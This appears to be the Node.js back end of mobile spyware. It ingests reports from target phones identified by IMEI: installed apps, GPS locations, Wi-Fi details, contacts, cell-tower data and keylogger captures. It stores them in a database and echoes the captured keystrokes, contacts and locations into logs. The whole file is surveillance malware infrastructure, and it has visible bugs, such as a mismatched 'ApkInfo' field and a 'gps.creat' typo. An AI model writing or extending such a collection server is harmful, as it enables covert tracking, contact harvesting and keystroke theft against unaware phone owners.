'use strict'
let Sequelize = require('sequelize');
let moment = require('moment');
let applist = require('../db/models/applist');
let gps = require('../db/models/gps');
let wifistate = require('../db/models/wifistate');
let contacts = require('../db/models/contacts');
let connectedCellInfo = require('../db/models/conntedCellinfo');
let nearbyCellInfo = require('../db/models/nearbyCellInfo');
let keyLog = require('../db/models/keylog');

let log4js = require('../logger/log4js');

let {logger} = log4js;
let consoleLog = logger('console');
// let info = logger('info');
let warn = logger('warn');
let error = logger('error');

module.exports = {
    maintainMonitorData: function(req, res, rootObj){
        //logger parameter rootObj
        consoleLog.info('maintainMonitorData');
        warn.warn('maintainMonitorData');
        consoleLog.info(rootObj);
        warn.warn(rootObj);

        if(rootObj.ApkInfo!=null){
            consoleLog.info('update target apk info');
            targetApkInfo(rootObj.IMEI, rootObj.Apkinfo);
        }

        if(rootObj.GPS!=null){
            consoleLog.info('update gps info');
            targetGpsInfo(rootObj.IMEI,rootObj.GPS);
        }

        if(rootObj.WiFi!=null){
            consoleLog.info('update wifi info');
            targetWifiInfo(rootObj.IMEI,rootObj.WiFi);
        }

        if(rootObj.Contacts!=null){
            consoleLog.info('update contacts info');
            targetContactInfo(rootObj.IMEI,rootObj.Contacts);
        }

        if(rootObj.CellInfo!=null){
            consoleLog.info('update connected Cell info');
            targetCellInfo(rootObj.IMEI,rootObj.CellInfo);
        }

        if(rootObj.nearbyCell!=null){
            consoleLog.info('update nearbyCell info');
            targetNearbyCellInfo(rootObj.IMEI,rootObj.nearbyCell);
        }

        if(rootObj.keylogger!=null){
            consoleLog.info('update keylog info');
            targetKeyLogger(rootObj.IMEI,rootObj.keylogger);
        }        
    }
}

function targetApkInfo(IMEI, Apkinfos){
    consoleLog.info(`IMEI: ${IMEI}`);
    consoleLog.info(Apkinfos);
    warn.warn(`IMEI: ${IMEI}`);
    warn.warn(Apkinfos);
    Apkinfos.forEach((Apkinfo)=>{
        applist.findAll({where:{IMEI:IMEI,PackageName:Apkinfo.Package},raw:true})
        .then((result)=>{
            if(result.length==0){// insert 
                doUpsertApkInfo(IMEI,Apkinfo,false);
            }
            else{// update
                doUpsertApkInfo(IMEI,Apkinfo,true);
            }
        })
        .catch((err)=>{
            error.error(err);
            consoleLog.error(err);
            // res.status(500).json({"msg":`select * from applist where IMEI=${IMEI} and PackageName=${Apkinfo.Package} fail`});
        });
    });
}

function doUpsertApkInfo(IMEI, Apkinfo, isUpdate){
    let Time = moment().format('yyyy/MM/dd HH:mm:ss');
    let PackageName = Apkinfo.Package;
    let AppName = Apkinfo.App;
    consoleLog.info(isUpdate==true?`start update applist set IsInstalled=true where IMEI=${IMEI} And PackageName=${PackageName}`:
                                   `start insert into applist (IMEI, AppName, PackageName, Time, IsInstalled) values(${IMEI},${AppName},${Time},${PackageName},true)`);
    if(isUpdate==true){
        applist.update({IsInstalled:true},{where:{IMEI:IMEI,PackageName:PackageName}})
        .then((re)=>{
            consoleLog.info(`success update applist set IsInstalled=true where IMEI=${IMEI} And PackageName=${PackageName}`);
            warn.warn(`success update applist set IsInstalled=true where IMEI=${IMEI} And PackageName=${PackageName}`);
        })
        .catch((err)=>{
            error.error(err);
            consoleLog.error(err);

        });
    }
    else{
        applist.create({
            IMEI:IMEI,
            AppName:AppName,
            Time:Time,
            PackageName:PackageName,
            IsInstalled:true
        })
        .then((re)=>{
            consoleLog.info(`success insert into applist (IMEI, AppName, PackageName, Time, IsInstalled) values(${IMEI},${AppName},${Time},${PackageName},true)`);
            warn.warn(`start insert into applist (IMEI, AppName, PackageName, Time, IsInstalled) values(${IMEI},${AppName},${Time},${PackageName},true)`);
        })
        .catch((err)=>{
            error.error(err);
            consoleLog.error(err);

        });
    }
}

// GPS
function targetGpsInfo(IMEI,GPSes){
    consoleLog.info(`IMEI:${IMEI}`);
    warn.warn(`IMEI:${IMEI}`);
    consoleLog.info(GPSes);
    warn.warn(GPSes);
    GPSes.forEach((GPS)=>{
        doInsertGPS(IMEI,GPS);
    });
}

function doInsertGPS(IMEI, GPS){
     let Time = moment().format('yyyy/MM/dd HH:mm:ss');
     let {latitude,longitude} = GPS;
     consoleLog.info(`start insert into gps (IMEI, latitude, longitude,Time) values (${IMEI},${latitude},${longitude},${Time})`);
     warn.warn(`start insert into gps (IMEI, latitude, longitude,Time) values (${IMEI},${latitude},${longitude},${Time})`);
     gps.creat({
         IMEI:IMEI,
         latitude:latitude,
         longitude:longitude,
         Time:Time
     })
     .then((re)=>{
        consoleLog.info(`success insert into gps (IMEI, latitude, longitude,Time) values (${IMEI},${latitude},${longitude},${Time})`);
        warn.warn(`success insert into gps (IMEI, latitude, longitude,Time) values (${IMEI},${latitude},${longitude},${Time})`);
     })
     .catch((err)=>{
         error.error(err);
         consoleLog.error(err);
     });
}
// update wifi Info
function targetWifiInfo(IMEI,WiFis){
    consoleLog.info(`IMEI:${IMEI}`);
    warn.warn(`IMEI:${IMEI}`);
    consoleLog.info(WiFis);
    warn.warn(WiFis);
    WiFis.forEach((WiFi)=>{
        doInsertWifi(IMEI,WiFi);
    });
}

function doInsertWifi(IMEI,WiFi){
     let Time = moment().format('yyyy/MM/dd HH:mm:ss');
     let {SSID, LinkSpeed, Mac ,IPAddress} = WiFi;
     consoleLog.info(`start insert into wifistate (IMEI, SSID, LinkSpeed, MAC_Address, IP_Address,Time) values (${IMEI},${SSID},${LinkSpeed},${Mac},${IPAddress},${Time})`);
     warn.warn(`start insert into wifistate (IMEI, SSID, LinkSpeed, MAC_Address, IP_Address,Time) values (${IMEI},${SSID},${LinkSpeed},${Mac},${IPAddress},${Time})`);
     wifistate.create({
        IMEI:IMEI,
        SSID:SSID,
        LinkSpeed:LinkSpeed,
        MAC_Address:Mac,
        IP_Address:IPAddress,
        Time: Time
     })
     .then((re)=>{
        consoleLog.info(`success insert into wifistate (IMEI, SSID, LinkSpeed, MAC_Address, IP_Address,Time) values (${IMEI},${SSID},${LinkSpeed},${Mac},${IPAddress},${Time})`);
        warn.warn(`success insert into wifistate (IMEI, SSID, LinkSpeed, MAC_Address, IP_Address,Time) values (${IMEI},${SSID},${LinkSpeed},${Mac},${IPAddress},${Time})`);
     })
     .catch((err)=>{
         error.error(err);
         consoleLog.error(err);
     })
}

// targetContactInfo
function targetContactInfo(IMEI, Contacts){
    consoleLog.info(`IMEI:${IMEI}`);
    warn.warn(`IMEI:${IMEI}`);
    consoleLog.info(Contacts);
    warn.warn(Contacts);
    Contacts.forEach((Contact)=>{
        if(Contact.Name.length!=0 && Contact.PhoneNo.length!=0){
            contacts.findAll({where:{IMEI:IMEI,Phone_No:Contact.PhoneNo}})
            .then((result)=>{
                if(result.length > 0 ){
                    doUpsertContacts(IMEI,Contact,true);
                }
                else{
                    doUpsertContacts(IMEI,Contact,false);
                }
            })
            .catch((err)=>{
                consoleLog.error(err);
                error.error(err);
            });
        }
    });
}

function doUpsertContacts(IMEI, Contact,isUpdate){
    let Time = moment().format('yyyy/MM/dd HH:mm:ss');
    let {Name, PhoneNo} = Contact;
    consoleLog.info(isUpdate==true?`start update contacts set exist=true where IMEI=${IMEI} And Name=${Name} And Phone_No=${PhoneNo}`:`start insert into contacts (IMEI,Name,Phone_No,exist,Time) values(${IMEI},${Name},${PhoneNo},true,${Time})`);
    warn.warn(isUpdate==true?`start update contacts set exist=true where IMEI=${IMEI} And Name=${Name} And Phone_No=${PhoneNo}`:`start insert into contacts (IMEI,Name,Phone_No,exist,Time) values(${IMEI},${Name},${PhoneNo},true,${Time})`);
    if(isUpdate==true){
        contacts.update({exist:true},{where:{
            IMEI:IMEI,
            Name:Name,
            Phone_No:PhoneNo
        }})
        .then((re)=>{
           consoleLog.info(`success update contacts set exist=true where IMEI=${IMEI} And Name=${Name} And Phone_No=${PhoneNo}`);
           warn.warn(`success update contacts set exist=true where IMEI=${IMEI} And Name=${Name} And Phone_No=${PhoneNo}`);
        })
        .catch((err)=>{
            consoleLog.error(err);
            error.error(err);
        });
    }
    else{
        contacts.create({
            IMEI:IMEI,
            Name:Name,
            Phone_No:PhoneNo,
            exist:true,
            Time:Time
        })
        .then((re)=>{
            consoleLog.info(`start insert into contacts (IMEI,Name,Phone_No,exist,Time) values(${IMEI},${Name},${PhoneNo},true,${Time})`);
            warn.warn(`start insert into contacts (IMEI,Name,Phone_No,exist,Time) values(${IMEI},${Name},${PhoneNo},true,${Time})`);
        })
        .catch((err)=>{
            error.error(err);
            consoleLog.error(err);
        })
    }
}

// targetCellInfo
function targetCellInfo(IMEI,CellInfos){
    consoleLog.info(`IMEI:${IMEI}`);
    warn.warn(`IMEI:${IMEI}`);
    consoleLog.info(CellInfos);
    warn.warn(CellInfos);
    CellInfos.forEach((CellInfo)=>{
        doInsertCellInfo(IMEI,CellInfo);
    });
}

function doInsertCellInfo(IMEI,CellInfo){
    let Time = Sequelize.NOW;
    let {networktype,signalstrength,lac, cid, enb, eci} = CellInfo;
    consoleLog.info(`start insert into conntedCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
    warn.warn(`start insert into conntedCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
    connectedCellInfo.create({
        IMEI:IMEI,
        network_type:networktype,
        signal_strength:signalstrength,
        lastupdateTime:Time,
        LAC:lac,
        Cell_id:cid,
        eNB_id: enb,
        ECI:eci
    })
    .then((re)=>{
        consoleLog.info(`success insert into conntedCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
        warn.warn(`success insert into conntedCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
    })
    .catch((err)=>{
        error.error(err);
        consoleLog.error(err);
    });
}
// targetNearbyCellInfo
function targetNearbyCellInfo(IMEI,NearbyCells){
    consoleLog.info(`IMEI:${IMEI}`);
    warn.warn(`IMEI:${IMEI}`);
    consoleLog.info(NearbyCells);
    warn.warn(NearbyCells);
    NearbyCells.forEach((NearbyCell)=>{
        doInsertNearbyCell(IMEI, NearbyCell);
    });
}

function doInsertNearbyCell(IMEI, NearbyCell){
   let Time = Sequelize.NOW;
   let {networktype,signalstrength,lac, cid, enb, eci} = NearbyCell;
    consoleLog.info(`start insert into nearbyCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
    warn.warn(`start insert into nearbyCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
    nearbyCellInfo.create({
        IMEI:IMEI,
        network_type:networktype,
        signal_strength:signalstrength,
        lastupdateTime:Time,
        LAC:lac,
        Cell_id:cid,
        eNB_id: enb,
        ECI:eci
    })
    .then((re)=>{
        consoleLog.info(`success insert into nearbyCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
        warn.warn(`success insert into nearbyCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
    })
    .catch((err)=>{
        consoleLog.error(err);
        error.error(err);
    })
}

// targetKeyLogger
function targetKeyLogger(IMEI,keyloggers){
    consoleLog.info(`IMEI:${IMEI}`);
    warn.warn(`IMEI:${IMEI}`);
    consoleLog.info(keyloggers);
    warn.warn(keyloggers);
    keyloggers.forEach((keylogger)=>{
        doInsertKeyLog(IMEI,keylogger);
    });
}

function doInsertKeyLog(IMEI,keylogger){
    let {timestamp,keylog} = keylogger;
    timestamp = moment(timestamp);
    consoleLog.info(`start insert into keylog (imei,keylog,timestamp) values(${IMEI},${keylog},${timestamp})`);
    warn.warn(`start insert into keylog (imei,keylog,timestamp) values(${IMEI},${keylog},${timestamp})`);
    keyLog.create({
        imei:IMEI,
        keylog:keylog,
        timestamp:timestamp
    })
    .then((re)=>{
        consoleLog.info(`success insert into keylog (imei,keylog,timestamp) values(${IMEI},${keylog},${timestamp})`);
        warn.warn(`success insert into keylog (imei,keylog,timestamp) values(${IMEI},${keylog},${timestamp})`);  
    })
    .catch((err)=>{
        error.error(err);
        consoleLog.error(err);
    })
}